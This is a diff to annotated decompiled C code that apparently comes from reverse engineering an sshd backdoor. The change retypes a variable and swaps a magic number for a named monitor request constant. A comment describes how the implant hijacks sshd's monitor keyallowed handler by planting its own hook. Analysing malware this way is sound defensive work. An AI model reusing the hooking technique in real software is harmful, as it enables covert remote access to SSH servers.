@@ -28,7 +28,7 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
   pfn_exit_t exit_fn;
   u8 control_flags;
   uint rsa_payload_span;
-  int op_result;
+  monitor_reqtype_t op_result;
   BOOL operation_ok;
   int scratch_index;
   uid_t caller_uid;
@@ -450,8 +450,8 @@ LAB_00109d36:
                                                                     _2_1_ & 0x3f) * 2;
                                                   }
                                                   // AutoDoc: Select the monitor request opcode the attacker wants to impersonate and drop mm_answer_keyallowed_hook into the live slot so the next exchange hits the implant.
-                                                  sshd_ctx->mm_answer_keyallowed_reqtype = op_result + 1
-                                                  ;
+                                                  sshd_ctx->mm_answer_keyallowed_reqtype =
+                                                       op_result + MONITOR_ANS_MODULI;
                                                   *keyallowed_slot = sshd_ctx->mm_answer_keyallowed_hook;
                                                   goto LAB_0010a076;
                                                   }
